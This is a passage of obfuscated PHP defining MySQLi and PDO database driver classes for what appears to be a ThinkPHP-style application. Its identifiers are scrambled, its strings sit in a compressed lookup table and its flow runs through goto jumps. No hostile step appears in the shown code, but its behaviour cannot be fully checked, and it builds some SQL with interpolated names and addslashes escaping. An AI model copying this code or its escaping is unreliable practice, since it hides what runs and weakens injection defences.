($f½ñ±¿¼¸¤ < $_SERVER[”Ì÷ñ­î¸][548]) { if ($f½ñ±¿¼¸¤ >= 0) { break; } $f½ñ±¿¼¸¤++; } $_SERVER[ù] = explode($_SERVER[”Ì÷ñ­î¸][549], gzinflate(substr($_SERVER[”Ì÷ñ­î¸][550], 10, -8))); goto d¤õ…Ö‚½Ù; Dä™¬ØØÇÑ: class DbMysqli extends Db { public function __construct($aÛÈ¾í†… = '') { $bì…·Œ¹ˆà =& $_SERVER[”Ì÷ñ­î¸]; if (!extension_loaded($bì…·Œ¹ˆà[728])) { think_exception(think_lang($bì…·Œ¹ˆà[10]) . $bì…·Œ¹ˆà[827]); } if (!empty($aÛÈ¾í†…)) { $this->config = $aÛÈ¾í†…; if (empty($this->config[$bì…·Œ¹ˆà[13]])) { $this->config[$bì…·Œ¹ˆà[13]] = $bì…·Œ¹ˆà[33]; } } } public function connect($BŸ¤…äø = '', $b¼£ğîÃÔº = 0) { $a‘¢öñ¯†¿ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->linkID[$b¼£ğîÃÔº])) { goto bÁ‚ÜÕæÂ; A¿¤Ë¢èÇ: $B„é ßì“ô = $this->linkID[$b¼£ğîÃÔº]->server_version; $this->linkID[$b¼£ğîÃÔº]->query($a‘¢öñ¯†¿[805] . think_config($a‘¢öñ¯†¿[806]) . $a‘¢öñ¯†¿[55]); if ($B„é ßì“ô > $a‘¢öñ¯†¿[807]) { $this->linkID[$b¼£ğîÃÔº]->query($a‘¢öñ¯†¿[808]); } goto fùÈƒç‡Ü; bÁ‚ÜÕæÂ: if (empty($BŸ¤…äø)) { $BŸ¤…äø = $this->config; } $this->linkID[$b¼£ğîÃÔº] = new mysqli($BŸ¤…äø[$a‘¢öñ¯†¿[801]], $BŸ¤…äø[$a‘¢öñ¯†¿[803]], $BŸ¤…äø[$a‘¢öñ¯†¿[804]], $BŸ¤…äø[$a‘¢öñ¯†¿[17]], $BŸ¤…äø[$a‘¢öñ¯†¿[802]] ? intval($BŸ¤…äø[$a‘¢öñ¯†¿[802]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto A¿¤Ë¢èÇ; fùÈƒç‡Ü: $this->connected = !0; if (1 != think_config($a‘¢öñ¯†¿[18])) { unset($this->config); } goto e£—›©ğÊ; e£—›©ğÊ: } return $this->linkID[$b¼£ğîÃÔº]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($c½´÷ª‘ÍÅ) { goto f†±³©Ôã£; f†±³©Ôã£: $dèŠÙ†í‹ =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÉĞ¿„†ô—; Có¬“é•Ï©: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto e¤Í¶ ÍŒ±; CÉĞ¿„†ô—: $this->queryStr = $c½´÷ª‘ÍÅ; if ($this->queryID) { $this->free(); } think_action_status($dèŠÙ†í‹[19], 1); goto Aö¿½›ßÂ; Aö¿½›ßÂ: think_status($dèŠÙ†í‹[20]); $this->queryID = $this->_linkID->query($c½´÷ª‘ÍÅ); if ($this->_linkID->more_results()) { while (($dé¿á‡Àêä = $this->_linkID->next_result()) != NULL) { $dé¿á‡Àêä->free_result(); } } goto Có¬“é•Ï©; e¤Í¶ ÍŒ±: } public function execute($b°¯õ‡¿Ô) { goto bÀÄ‹˜Õ˜; fÙÖçÕ¼ñ³: $this->queryStr = $b°¯õ‡¿Ô; if ($this->queryID) { $this->free(); } think_action_status($d…ÚŠâÖ‡ª[21], 1); goto Bí‚Û‚£Š’; Bí‚Û‚£Š’: think_status($d…ÚŠâÖ‡ª[20]); $C§˜¾¡ØŠÚ = $this->_linkID->query($b°¯õ‡¿Ô); $this->debug(); goto aº²µæ†É×; aº²µæ†É×: if (!1 === $C§˜¾¡ØŠÚ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Cï…¦ÜÜËø; bÀÄ‹˜Õ˜: $d…ÚŠâÖ‡ª =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fÙÖçÕ¼ñ³; Cï…¦ÜÜËø: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÔ×ÆÉ¼ñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dÔ×ÆÉ¼ñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÇ‚ª‹Áì– = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CÇ‚ª‹Áì–) { $this->error(); return !1; } } return !0; } private function getAll() { $dºŞ‚Öƒ¸Ê = array(); if ($this->numRows > 0) { for ($A¼™¢…Ş‡Ÿ = 0; $A¼™¢…Ş‡Ÿ < $this->numRows; $A¼™¢…Ş‡Ÿ++) { $dºŞ‚Öƒ¸Ê[$A¼™¢…Ş‡Ÿ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dºŞ‚Öƒ¸Ê; } public function getFields($cÉ½ÀŠå¬ñ) { $Cì£Ì°šš =& $_SERVER[”Ì÷ñ­î¸]; $a•›†ì°ƒ = $this->query($Cì£Ì°šš[812] . $this->parseKey($cÉ½ÀŠå¬ñ)); $Dá¥±ë³ó® = array(); if ($a•›†ì°ƒ) { foreach ($a•›†ì°ƒ as $E¸Ì¢ öô‚ => $a˜›‚ğ³°ˆ) { $Dá¥±ë³ó®[$a˜›‚ğ³°ˆ[$Cì£Ì°šš[27]]] = array($Cì£Ì°šš[28] => $a˜›‚ğ³°ˆ[$Cì£Ì°šš[27]], $Cì£Ì°šš[29] => $a˜›‚ğ³°ˆ[$Cì£Ì°šš[30]], $Cì£Ì°šš[31] => (bool) ($a˜›‚ğ³°ˆ[$Cì£Ì°šš[32]] === $Cì£Ì°šš[33]), $Cì£Ì°šš[34] => $a˜›‚ğ³°ˆ[$Cì£Ì°šš[35]], $Cì£Ì°šš[36] => strtolower($a˜›‚ğ³°ˆ[$Cì£Ì°šš[37]]) == $Cì£Ì°šš[38], $Cì£Ì°šš[39] => strtolower($a˜›‚ğ³°ˆ[$Cì£Ì°šš[40]]) == $Cì£Ì°šš[41]); } } return $Dá¥±ë³ó®; } public function getTables($EÄß™âµ”Ë = '') { $e¨Î¥µ¢Ü· =& $_SERVER[”Ì÷ñ­î¸]; $fÖƒ½±¨’— = !empty($EÄß™âµ”Ë) ? $e¨Î¥µ¢Ü·[814] . $EÄß™âµ”Ë : $e¨Î¥µ¢Ü·[815]; $f…‘¸ñ ÓÍ = $this->query($fÖƒ½±¨’—); $EïèÚã­¢‹ = array(); if ($f…‘¸ñ ÓÍ) { foreach ($f…‘¸ñ ÓÍ as $f„µ„ëœŒ‹ => $bÒ†µÎ­) { $EïèÚã­¢‹[$f„µ„ëœŒ‹] = current($bÒ†µÎ­); } } return $EïèÚã­¢‹; } public function replace($b…‚ÁĞÉÂÈ, $dÎ¬ãó³©ó = array()) { $c†œÛ‚ñó‚ =& $_SERVER[”Ì÷ñ­î¸]; foreach ($b…‚ÁĞÉÂÈ as $C±«´ÄÏß· => $eç²¥‹ƒ°î) { $cì†œ™ºîã = $this->parseValue($eç²¥‹ƒ°î); if (is_scalar($cì†œ™ºîã)) { $cìœ´äÅ©–[] = $cì†œ™ºîã; $fßÌ‹•æôê[] = $this->parseKey($C±«´ÄÏß·); } } $E»–ÈÒµöé = $c†œÛ‚ñó‚[816] . $this->parseTable($dÎ¬ãó³©ó[$c†œÛ‚ñó‚[267]]) . $c†œÛ‚ñó‚[817] . implode($c†œÛ‚ñó‚[47], $fßÌ‹•æôê) . $c†œÛ‚ñó‚[818] . implode($c†œÛ‚ñó‚[47], $cìœ´äÅ©–) . $c†œÛ‚ñó‚[819]; return $this->execute($E»–ÈÒµöé); } public function insertAll($AÊÙÔø¤Â, $cÚÄ‰ƒ³Ö = array(), $DÀ¾š¡Å…Ä = false) { goto BËĞİÇ¬Ú; eÈ¡·„ğµµ: $e…Ú™¾â– = array(); foreach ($AÊÙÔø¤Â as $A®ÁÊßÉíš) { $CĞ¶ëÎè¯¼ = array(); foreach ($A®ÁÊßÉíš as $fàšíƒ§« => $cí’àà¬») { $cí’àà¬» = $this->parseValue($cí’àà¬»); if (is_scalar($cí’àà¬»)) { $CĞ¶ëÎè¯¼[] = $cí’àà¬»; } } $e…Ú™¾â–[] = $fáè“Íƒ…[248] . implode($fáè“Íƒ…[47], $CĞ¶ëÎè¯¼) . $fáè“Íƒ…[819]; } array_walk($dÖÖÎ°¯ª, array($this, $fáè“Íƒ…[820])); goto C‚—»ù§÷; C‚—»ù§÷: $C¬Üöí‘è¸ = ($DÀ¾š¡Å…Ä ? $fáè“Íƒ…[821] : $fáè“Íƒ…[822]) . $fáè“Íƒ…[823] . $this->parseTable($cÚÄ‰ƒ³Ö[$fáè“Íƒ…[267]]) . $fáè“Íƒ…[817] . implode($fáè“Íƒ…[47], $dÖÖÎ°¯ª) . $fáè“Íƒ…[824] . implode($fáè“Íƒ…[47], $e…Ú™¾â–); return $this->execute($C¬Üöí‘è¸); goto bÏÙÌåÀ„Œ; BËĞİÇ¬Ú: $fáè“Íƒ… =& $_SERVER[”Ì÷ñ­î¸]; if (!is_array($AÊÙÔø¤Â[0])) { return !1; } $dÖÖÎ°¯ª = array_keys($AÊÙÔø¤Â[0]); goto eÈ¡·„ğµµ; bÏÙÌåÀ„Œ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DÉ¨Ñàç˜Œ =& $_SERVER[”Ì÷ñ­î¸]; $this->error = $this->_linkID->errno . $DÉ¨Ñàç˜Œ[4] . $this->_linkID->error; if ($DÉ¨Ñàç˜Œ[33] != $this->queryStr) { $this->error .= LNG($DÉ¨Ñàç˜Œ[45]) . $this->queryStr; } think_trace($this->error, $DÉ¨Ñàç˜Œ[33], $DÉ¨Ñàç˜Œ[46]); return $this->error; } public function escapeString($a“Ã¥Í¯Ê·) { if ($this->_linkID) { return $this->_linkID->real_escape_string($a“Ã¥Í¯Ê·); } else { return addslashes($a“Ã¥Í¯Ê·); } } public function parseKey(&$cáÀœ¶­İÊ, $aòŒ‹Á¬ÏÒ = true) { $Dî„Œë‹™“ =& $_SERVER[”Ì÷ñ­î¸]; if ($aòŒ‹Á¬ÏÒ) { $cáÀœ¶­İÊ = $this->parseKeyCheck($cáÀœ¶­İÊ); } if ($cáÀœ¶­İÊ != $Dî„Œë‹™“[176] && !preg_match($Dî„Œë‹™“[825], $cáÀœ¶­İÊ)) { $cáÀœ¶­İÊ = $Dî„Œë‹™“[826] . trim($cáÀœ¶­İÊ, $Dî„Œë‹™“[826]) . $Dî„Œë‹™“[826]; } return $cáÀœ¶­İÊ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($CÇ‰–¦Ì± = '') { $F÷…Ùö‹Ëó =& $_SERVER[”Ì÷ñ­î¸]; if (!class_exists($F÷…Ùö‹Ëó[828])) { think_exception(think_lang($F÷…Ùö‹Ëó[10]) . $F÷…Ùö‹Ëó[829]); } if (!empty($CÇ‰–¦Ì±)) { $this->config = $CÇ‰–¦Ì±; if (empty($this->config[$F÷…Ùö‹Ëó[13]])) { $this->config[$F÷…Ùö‹Ëó[13]] = array(); } } } public function connect($Eå‚è¾§»À = '', $Fª¤æŒ¥™ = 0) { $AíãèÕÍàğ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->linkID[$Fª¤æŒ¥™])) { goto C®Ø¥¤õŸ; aãƒ×…ì¬ï: $this->dbType = $this->_getDsnType($Eå‚è¾§»À[$AíãèÕÍàğ[830]]); if (in_array($this->dbType, array($AíãèÕÍàğ[831], $AíãèÕÍàğ[832], $AíãèÕÍàğ[833], $AíãèÕÍàğ[834]))) { think_exception($AíãèÕÍàğ[835] . $this->dbType . $AíãèÕÍàğ[836] . $this->dbType . $AíãèÕÍàğ[837]); } if (!$this->linkID[$Fª¤æŒ¥™]) { think_exception($AíãèÕÍàğ[838]); } goto fÌºĞÜœÖ; fÌºĞÜœÖ: $this->linkID[$Fª¤æŒ¥™]->exec($AíãèÕÍàğ[839] . think_config($AíãèÕÍàğ[806])); $this->connected = !0; if (1 != think_config($AíãèÕÍàğ[18])) { unset($this->config); } goto dìŒ¬ˆÌµ¦; C®Ø¥¤õŸ: if (empty($Eå‚è¾§»À)) { $Eå‚è¾§»À = $this->config; } if ($this->pconnect) { $Eå‚è¾§»À[$AíãèÕÍàğ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Fª¤æŒ¥™] = new PDO($Eå‚è¾§»À[$AíãèÕÍàğ[830]], $Eå‚è¾§»À[$AíãèÕÍàğ[803]], $Eå‚è¾§»À[$AíãèÕÍàğ[804]], $Eå‚è¾§»À[$AíãèÕÍàğ[13]]); } catch (PDOException $a´‹ÜÃì°Í) { think_exception($a´‹ÜÃì°Í->getMessage()); } goto aãƒ×…ì¬ï; dìŒ¬ˆÌµ¦: } return $this->linkID[$Fª¤æŒ¥™]; } public function free() { $this->PDOStatement = null; } public function query($f¿­º›£…–, $Fàƒ¸Ø­Œ§ = array()) { goto b¶Ôì¹îÂÜ; DíŞÅÂí: think_action_status($dÁÕ÷«Çİ[19], 1); think_status($dÁÕ÷«Çİ[20]); $this->PDOStatement = $this->_linkID->prepare($f¿­º›£…–); goto e¨Šó¹…š; b¶Ôì¹îÂÜ: $dÁÕ÷«Çİ =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Aáå±˜ÙÑÍ; e¨Šó¹…š: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $EÖ›äÊÌÁ = $this->PDOStatement->execute($Fàƒ¸Ø­Œ§); $this->debug(); goto eØ‚Î—Ö—á; eØ‚Î—Ö—á: if (!1 === $EÖ›äÊÌÁ) { $this->error(); return !1; } else { return $this->getAll(); } goto DŞ©Ùß„Ëò; Aáå±˜ÙÑÍ: $this->queryStr = $f¿­º›£…–; if (!empty($Fàƒ¸Ø­Œ§)) { $this->queryStr .= $dÁÕ÷«Çİ[840] . print_r($Fàƒ¸Ø­Œ§, !0) . $dÁÕ÷«Çİ[841]; } if (!empty($this->PDOStatement)) { $this->free(); } goto DíŞÅÂí; DŞ©Ùß„Ëò: } public function execute($aóâÛ¢Š¿, $fêÛ´Û±º® = array()) { goto b¾•ß”‹…§; b¾•ß”‹…§: $fÀï•¼–›è =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E‡®ï‰ÃÔØ; E‡®ï‰ÃÔØ: $this->queryStr = $aóâÛ¢Š¿; if (!empty($fêÛ´Û±º®)) { $this->queryStr .= $fÀï•¼–›è[840] . print_r($fêÛ´Û±º®, !0) . $fÀï•¼–›è[841]; } $eÒ¦ÚîĞ£İ = !1; goto EØ˜İ‹±ìê; b†ÔèÉÂ“Ç: $càƒ‡ªÁÎ´ = $this->PDOStatement->execute($fêÛ´Û±º®); $this->debug(); if (!1 === $càƒ‡ªÁÎ´) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($eÒ¦ÚîĞ£İ || preg_match($fÀï•¼–›è[846], $aóâÛ¢Š¿)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto D³¥ôÊ°‚‚; EØ˜İ‹±ìê: if ($this->dbType == $fÀï•¼–›è[834]) { if (preg_match($fÀï•¼–›è[842], $this->queryStr, $aÅÒ§Ÿ±”Ü)) { $this->table = think_config($fÀï•¼–›è[843]) . str_ireplace(think_config($fÀï•¼–›è[844]), $fÀï•¼–›è[361], $aÅÒ§Ÿ±”Ü[2]); $eÒ¦ÚîĞ£İ = (bool) $this->query($fÀï•¼–›è[845] . strtoupper($this->table) . $fÀï•¼–›è[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($fÀï•¼–›è[21], 1); goto aÀÇˆİñâõ; aÀÇˆİñâõ: think_status($fÀï•¼–›è[20]); $this->PDOStatement = $this->_linkID->prepare($aóâÛ¢Š¿); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto b†ÔèÉÂ“Ç; D³¥ôÊ°‚‚: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e…ĞˆõÙË« = $this->_linkID->commit(); $this->transTimes = 0; if (!$e…ĞˆõÙË«) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f§Å­ëÄŸ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$f§Å­ëÄŸ) { $this->error(); return !1; } } return !0; } private function getAll() { $dÕÔÒ¸µõ” = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($dÕÔÒ¸µõ”); return $dÕÔÒ¸µõ”; } public function getFields($bØ’‘Ô…Å¢) { goto b­ò‡ŸŠùö; dÛ®Ñ¹Ù¯à: $cËºæšÆçÌ = $this->query($eÅíÏÒòÕ£); $fš®‹ãÌ²œ = array(); if ($cËºæšÆçÌ) { foreach ($cËºæšÆçÌ as $EõíƒÎÅŒÑ => $D¿ì¸¦¹¬¢) { $D¿ì¸¦¹¬¢ = array_change_key_case($D¿ì¸¦¹¬¢); $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[28]] = isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[28]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[28]] : $EÚ…”ËÍ†·[361]; $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[29]] = isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[29]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[29]] : $EÚ…”ËÍ†·[361]; $B©Øå£¿’ = isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[261]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[261]] : $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[28]]; $fš®‹ãÌ²œ[$B©Øå£¿’] = array($EÚ…”ËÍ†·[28] => $B©Øå£¿’, $EÚ…”ËÍ†·[29] => $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[29]], $EÚ…”ËÍ†·[31] => (bool) (isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[99]]) && $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[99]] === $EÚ…”ËÍ†·[33] || isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[31]]) && $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[31]] === $EÚ…”ËÍ†·[33]), $EÚ…”ËÍ†·[34] => isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[34]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[34]] : (isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[53]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[53]] : $EÚ…”ËÍ†·[361]), $EÚ…”ËÍ†·[36] => isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[89]]) ? strtolower($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[89]]) == $EÚ…”ËÍ†·[38] : (isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[54]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[54]] : !1), $EÚ…”ËÍ†·[39] => isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[863]]) ? strtolower($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[863]]) == $EÚ…”ËÍ†·[41] : (isset($D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[89]]) ? $D¿ì¸¦¹¬¢[$EÚ…”ËÍ†·[89]] : !1)); } } goto eµŠ‚Ü”ˆÖ; eµŠ‚Ü”ˆÖ: return $fš®‹ãÌ²œ; goto b™À…œÇÍÕ; b­ò‡ŸŠùö: $EÚ…”ËÍ†· =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!0); if (think_config($EÚ…”ËÍ†·[847])) { $eÅíÏÒòÕ£ = str_replace($EÚ…”ËÍ†·[848], $bØ’‘Ô…Å¢, think_config($EÚ…”ËÍ†·[847])); } else { switch ($this->dbType) { case $EÚ…”ËÍ†·[831]: case $EÚ…”ËÍ†·[849]: $eÅíÏÒòÕ£ = "\x53\105\114\x45\103\x54\x20\x20\x20\143\157\x6c\165\155\156\137\x6e\x61\155\145\40\141\x73\40\x27\x4e\141\x6d\145\47\54\x20\x20\40\144\x61\x74\x61\137\164\x79\160\145\x20\141\163\x20\x27\124\x79\160\145\x27\54\x20\x20\40\143\157\x6c\x75\155\156\137\144\145\146\141\165\154\x74\x20\x61\x73\x20\47\x44\145\x66\141\x75\154\164\47\54\x20\x20\40\151\163\137\x6e\x75\x6c\154\141\x62\154\145\40\x61\x73\40\47\116\x75\154\x6c\47\12\11\x9\106\122\117\x4d\x9\151\156\146\157\162\x6d\x61\x74\151\x6f\x6e\137\163\143\x68\x65\x6d\x61\x2e\164\141\x62\154\145\x73\x20\101\x53\40\164\xa\x9\11\x4a\x4f\x49\x4e\11\151\156\x66\157\162\155\x61\164\151\157\156\137\163\x63\150\145\155\x61\56\143\157\x6c\x75\155\156\163\x20\101\123\40\x63\12\x9\11\117\116\x20\40\x74\56\164\x61\x62\x6c\145\137\143\141\x74\141\x6c\157\147\x20\x3d\40\x63\56\x74\x61\142\154\145\x5f\x63\141\164\x61\x6c\x6f\147\12\x9\x9\x41\x4e\104\x20\x74\x2e\x74\141\142\154\x65\137\163\143\150\x65\155\141\40\75\x20\x63\x2e\x74\141\x62\154\x65\x5f\x73\x63\150\145\155\x61\xa\11\x9\101\x4e\x44\x20\x74\56\164\141\142\x6c\x65\x5f\156\x61\x6d\145\40\75\40\x63\x2e\164\141\x62\x6c\145\137\x6e\x61\155\x65\xa\11\11\127\110\x45\x52\x45\x20\x20\x20\x74\56\164\141\x62\154\x65\x5f\x6e\141\x6d\145\x20\75\x20\47{$bØ’‘Ô…Å¢}\x27"; break; case $EÚ…”ËÍ†·[850]: $eÅíÏÒòÕ£ = $EÚ…”ËÍ†·[851] . $bØ’‘Ô…Å¢ . $EÚ…”ËÍ†·[852]; break; case $EÚ…”ËÍ†·[832]: case $EÚ…”ËÍ†·[834]: $eÅíÏÒòÕ£ = $EÚ…”ËÍ†·[853] . $EÚ…”ËÍ†·[854] . $EÚ…”ËÍ†·[855] . strtoupper($bØ’‘Ô…Å¢) . $EÚ…”ËÍ†·[856] . strtoupper($bØ’‘Ô…Å¢) . $EÚ…”ËÍ†·[857]; break; case $EÚ…”ËÍ†·[858]: $eÅíÏÒòÕ£ = $EÚ…”ËÍ†·[859] . $bØ’‘Ô…Å¢ . $EÚ…”ËÍ†·[860]; break; case $EÚ…”ËÍ†·[833]: break; case $EÚ…”ËÍ†·[861]: default: $eÅíÏÒòÕ£ = $EÚ…”ËÍ†·[862] . ($this->dbType == $EÚ…”ËÍ†·[861] ? "\140{$bØ’‘Ô…Å¢}\140" : $bØ’‘Ô…Å¢); } } goto dÛ®Ñ¹Ù¯à; b™À…œÇÍÕ: } public function getTables($E†©ä¯ŸöÆ = '') { $b·Úô§ê¬ =& $_SERVER[”Ì÷ñ­î¸]; if (think_config($b·Úô§ê¬[864])) { $F‚§Ü‚èˆô = str_replace($b·Úô§ê¬[865], $E†©ä¯ŸöÆ, think_config($b·Úô§ê¬[864])); } else { switch ($this->dbType) { case $b·Úô§ê¬[832]: case $b·Úô§ê¬[834]: $F‚§Ü‚èˆô = $b·Úô§ê¬[866]; break; case $b·Úô§ê¬[831]: case $b·Úô§ê¬[849]: $F‚§Ü‚èˆô = $b·Úô§ê¬[867]; break; case $b·Úô§ê¬[858]: $F‚§Ü‚èˆô = $b·Úô§ê¬[868]; break; case $b·Úô§ê¬[833]: think_exception(think_lang($b·Úô§ê¬[869]) . $b·Úô§ê¬[870]); break; case $b·Úô§ê¬[850]: $F‚§Ü‚èˆô = $b·Úô§ê¬[42] . $b·Úô§ê¬[43] . $b·Úô§ê¬[44]; break; case $b·Úô§ê¬[861]: default: if (!empty($E†©ä¯ŸöÆ)) { $F‚§Ü‚èˆô = $b·Úô§ê¬[814] . $E†©ä¯ŸöÆ; } else { $F‚§Ü‚èˆô = $b·Úô§ê¬[815]; } } } $aããÌáöÅ¯ = $this->query($F‚§Ü‚èˆô); $fĞ¼Å´ƒÄ‰ = array(); foreach ($aããÌáöÅ¯ as $Eƒ’¥Í‘Âº => $C ãÓ¾ŞÅ‚) { $fĞ¼Å´ƒÄ‰[$Eƒ’¥Í‘Âº] = current($C ãÓ¾ŞÅ‚); } return $fĞ¼Å´ƒÄ‰; } protected function parseLimit($AÑÛôÙ•œã) { $Cç±è×ÈÓ¾ =& $_SERVER[”Ì÷ñ­î¸]; $EÎ¼øãÒê¯ = $Cç±è×ÈÓ¾[33]; if (!empty($AÑÛôÙ•œã)) { switch ($this->dbType) { case $Cç±è×ÈÓ¾[858]: case $Cç±è×ÈÓ¾[850]: $AÑÛôÙ•œã = explode($Cç±è×ÈÓ¾[47], $AÑÛôÙ•œã); if (count($AÑÛôÙ•œã) > 1) { $EÎ¼øãÒê¯ .= $Cç±è×ÈÓ¾[48] . $AÑÛôÙ•œã[1] . $Cç±è×ÈÓ¾[49] . $AÑÛôÙ•œã[0] . $Cç±è×ÈÓ¾[50]; } else { $EÎ¼øãÒê¯ .= $Cç±è×ÈÓ¾[48] . $AÑÛôÙ•œã[0] . $Cç±è×ÈÓ¾[50]; } break; case $Cç±è×ÈÓ¾[831]: case $Cç±è×ÈÓ¾[849]: break; case $Cç±è×ÈÓ¾[833]: break; case $Cç±è×ÈÓ¾[832]: case $Cç±è×ÈÓ¾[834]: break; case $Cç±è×ÈÓ¾[861]: default: $EÎ¼øãÒê¯ .= $Cç±è×ÈÓ¾[48] . $AÑÛôÙ•œã . $Cç±è×ÈÓ¾[50]; } } return $EÎ¼øãÒê¯; } public function parseKey(&$f¼ïÁä’æ, $eöçëÉ¿ = true) { $b‘¼â®ÊÛÃ =& $_SERVER[”Ì÷ñ­î¸]; if ($eöçëÉ¿) { $f¼ïÁä’æ = $this->parseKeyCheck($f¼ïÁä’æ); } if ($this->dbType == $b‘¼â®ÊÛÃ[861]) { if ($f¼ïÁä’æ != $b‘¼â®ÊÛÃ[176] && !preg_match($b‘¼â®ÊÛÃ[825], $f¼ïÁä’æ)) { $f¼ïÁä’æ = $b‘¼â®ÊÛÃ[826] . trim($f¼ïÁä’æ, $b‘¼â®ÊÛÃ[826]) . $b‘¼â®ÊÛÃ[826]; } return $f¼ïÁä’æ; } else { return parent::parseKey($f¼ïÁä’æ); } } public function close() { $this->_linkID = null; } public function error() { $dŞ°–¼‰Ğ­ =& $_SERVER[”Ì÷ñ­î¸]; if ($this->PDOStatement) { $c—½Ã¤—Ë = $this->PDOStatement->errorInfo(); $this->error = $c—½Ã¤—Ë[1] . $dŞ°–¼‰Ğ­[4] . $c—½Ã¤—Ë[2]; } else { $this->error = $dŞ°–¼‰Ğ­[33]; } if ($dŞ°–¼‰Ğ­[33] != $this->queryStr) { $this->error .= LNG($dŞ°–¼‰Ğ­[45]) . $this->queryStr; } think_trace($this->error, $dŞ°–¼‰Ğ­[33], $dŞ°–¼‰Ğ­[46]); return $this->error; } public function escapeString($EšÀĞ„‚ÀÑ) { $AŞ’²‚áÉÛ =& $_SERVER[”Ì÷ñ­î¸]; switch ($this->dbType) { case $AŞ’²‚áÉÛ[858]: case $AŞ’²‚áÉÛ[831]: case $AŞ’²‚áÉÛ[849]: case $AŞ’²‚áÉÛ[861]: return addslashes($EšÀĞ„‚ÀÑ); case $AŞ’²‚áÉÛ[833]: case $AŞ’²‚áÉÛ[850]: case $AŞ’²‚áÉÛ[832]: case $AŞ’²‚áÉÛ[834]: return str_ireplace($AŞ’²‚áÉÛ[55], $AŞ’²‚áÉÛ[56], $EšÀĞ„‚ÀÑ); } } protected function parseValue($FÕƒ¶èÕµ­) { $aĞ•¼Ï‰Ø„ =& $_SERVER[”Ì÷ñ­î¸]; if (is_string($FÕƒ¶èÕµ­)) { $FÕƒ¶èÕµ­ = strpos($FÕƒ¶èÕµ­, $aĞ•¼Ï‰Ø„[4]) === 0 ? $this->escapeString($FÕƒ¶èÕµ­) : $aĞ•¼Ï‰Ø„[871] . $this->escapeString($FÕƒ¶èÕµ­) . $aĞ•¼Ï‰Ø„[871]; } elseif (isset($FÕƒ¶èÕµ­[0]) && is_string($FÕƒ¶èÕµ­[0]) && strtolower($FÕƒ¶èÕµ­[0]) == $aĞ•¼Ï‰Ø„[285]) { $FÕƒ¶èÕµ­ = $this->escapeString($FÕƒ¶èÕµ­[1]); } elseif (is_array($FÕƒ¶èÕµ­)) { $FÕƒ¶èÕµ­ = array_map(array($this, $aĞ•¼Ï‰Ø„[872]), $FÕƒ¶èÕµ­); } elseif (is_bool($FÕƒ¶èÕµ­)) { $FÕƒ¶èÕµ­ = $FÕƒ¶èÕµ­ ? $aĞ•¼Ï‰Ø„[83] : $aĞ•¼Ï‰Ø„[468]; } elseif (is_null($FÕƒ¶èÕµ­)) { $FÕƒ¶èÕµ­ = $aĞ•¼Ï‰Ø„[99]; } return $FÕƒ¶èÕµ­; } public function getLastInsertId() { 